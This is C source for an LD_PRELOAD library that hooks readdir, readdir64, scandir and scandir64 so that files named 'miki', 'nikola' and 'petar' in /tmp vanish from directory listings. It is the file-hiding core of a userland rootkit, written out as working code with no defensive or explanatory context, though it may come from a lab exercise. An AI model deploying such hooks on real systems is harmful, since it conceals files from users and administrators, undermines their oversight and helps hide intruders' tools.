#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>

// Files to hide (in /tmp)
static const char *hidden_files[] = {"miki", "nikola", "petar"};
static const int num_hidden = 3;

// Check if this entry should be hidden
static int should_hide(const char *d_name) {
    // Only hide files directly in /tmp/
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) == NULL) return 0;
    
    // Check if we're in /tmp
    if (strcmp(cwd, "/tmp") != 0) return 0;
    
    // Check if filename matches hidden list
    for (int i = 0; i < num_hidden; i++) {
        if (strcmp(d_name, hidden_files[i]) == 0) {
            return 1; // Hide it!
        }
    }
    return 0;
}

// Get original function
static void *get_real(const char *name) {
    void *f = dlsym(RTLD_NEXT, name);
    if (!f) {
        fprintf(stderr, "Error: %s\n", dlerror());
        exit(1);
    }
    return f;
}

// Intercept readdir()
struct dirent *readdir(DIR *dirp) {
    typedef struct dirent *(*real_readdir_t)(DIR *);
    static real_readdir_t real_readdir = NULL;
    if (!real_readdir) real_readdir = (real_readdir_t) get_real("readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;  // Show this file
        }
        // Skip hidden files, continue to next entry
    }
    return NULL;  // No more visible entries
}

// Intercept readdir64() - on 64-bit systems, this is often used instead
struct dirent64 *readdir64(DIR *dirp) {
    typedef struct dirent64 *(*real_readdir64_t)(DIR *);
    static real_readdir64_t real_readdir64 = NULL;
    if (!real_readdir64) real_readdir64 = (real_readdir64_t) get_real("readdir64");

    struct dirent64 *entry;
    while ((entry = real_readdir64(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

// Intercept scandir() - used by ls -l and many other tools
int scandir(const char *dirp, struct dirent ***namelist,
            int (*filter)(const struct dirent *),
            int (*compar)(const struct dirent **, const struct dirent **)) {
    typedef int (*real_scandir_t)(const char *, struct dirent ***,
                                   int (*)(const struct dirent *),
                                   int (*)(const struct dirent **, const struct dirent **));
    static real_scandir_t real_scandir = NULL;
    if (!real_scandir) real_scandir = (real_scandir_t) get_real("scandir");

    // Get full directory listing (we'll filter ourselves)
    struct dirent **full_list;
    int n = real_scandir(dirp, &full_list, NULL, compar);
    if (n < 0) return n;

    // Count visible entries
    int visible_count = 0;
    for (int i = 0; i < n; i++) {
        if (!should_hide(full_list[i]->d_name)) {
            visible_count++;
        }
    }

    // Allocate result array
    struct dirent **filtered_list = malloc(visible_count * sizeof(struct dirent *));
    if (!filtered_list) {
        // Free original list on error
        for (int i = 0; i < n; i++) free(full_list[i]);
        free(full_list);
        errno = ENOMEM;
        return -1;
    }

    // Copy only visible entries
    int idx = 0;
    for (int i = 0; i < n; i++) {
        if (!should_hide(full_list[i]->d_name)) {
            // Copy the entry (we need to own the memory)
            filtered_list[idx] = malloc(sizeof(struct dirent));
            if (filtered_list[idx]) {
                memcpy(filtered_list[idx], full_list[i], sizeof(struct dirent));
            }
            idx++;
        }
        free(full_list[i]);  // Free original entry
    }
    free(full_list);

    // Apply user's filter if provided
    if (filter) {
        int filtered_count = 0;
        struct dirent **final_list = malloc(visible_count * sizeof(struct dirent *));
        if (!final_list) {
            for (int i = 0; i < visible_count; i++) free(filtered_list[i]);
            free(filtered_list);
            errno = ENOMEM;
            return -1;
        }
        
        for (int i = 0; i < visible_count; i++) {
            if (filter(filtered_list[i])) {
                final_list[filtered_count++] = filtered_list[i];
            } else {
                free(filtered_list[i]);
            }
        }
        free(filtered_list);
        *namelist = final_list;
        return filtered_count;
    }

    *namelist = filtered_list;
    return visible_count;
}

// Intercept scandir64() for 64-bit systems
int scandir64(const char *dirp, struct dirent64 ***namelist,
              int (*filter)(const struct dirent64 *),
              int (*compar)(const struct dirent64 **, const struct dirent64 **)) {
    typedef int (*real_scandir64_t)(const char *, struct dirent64 ***,
                                     int (*)(const struct dirent64 *),
                                     int (*)(const struct dirent64 **, const struct dirent64 **));
    static real_scandir64_t real_scandir64 = NULL;
    if (!real_scandir64) real_scandir64 = (real_scandir64_t) get_real("scandir64");

    struct dirent64 **full_list;
    int n = real_scandir64(dirp, &full_list, NULL, compar);
    if (n < 0) return n;

    int visible_count = 0;
    for (int i = 0; i < n; i++) {
        if (!should_hide(full_list[i]->d_name)) {
            visible_count++;
        }
    }

    struct dirent64 **filtered_list = malloc(visible_count * sizeof(struct dirent64 *));
    if (!filtered_list) {
        for (int i = 0; i < n; i++) free(full_list[i]);
        free(full_list);
        errno = ENOMEM;
        return -1;
    }

    int idx = 0;
    for (int i = 0; i < n; i++) {
        if (!should_hide(full_list[i]->d_name)) {
            filtered_list[idx] = malloc(sizeof(struct dirent64));
            if (filtered_list[idx]) {
                memcpy(filtered_list[idx], full_list[i], sizeof(struct dirent64));
            }
            idx++;
        }
        free(full_list[i]);
    }
    free(full_list);

    if (filter) {
        int filtered_count = 0;
        struct dirent64 **final_list = malloc(visible_count * sizeof(struct dirent64 *));
        if (!final_list) {
            for (int i = 0; i < visible_count; i++) free(filtered_list[i]);
            free(filtered_list);
            errno = ENOMEM;
            return -1;
        }
        
        for (int i = 0; i < visible_count; i++) {
            if (filter(filtered_list[i])) {
                final_list[filtered_count++] = filtered_list[i];
            } else {
                free(filtered_list[i]);
            }
        }
        free(filtered_list);
        *namelist = final_list;
        return filtered_count;
    }

    *namelist = filtered_list;
    return visible_count;
}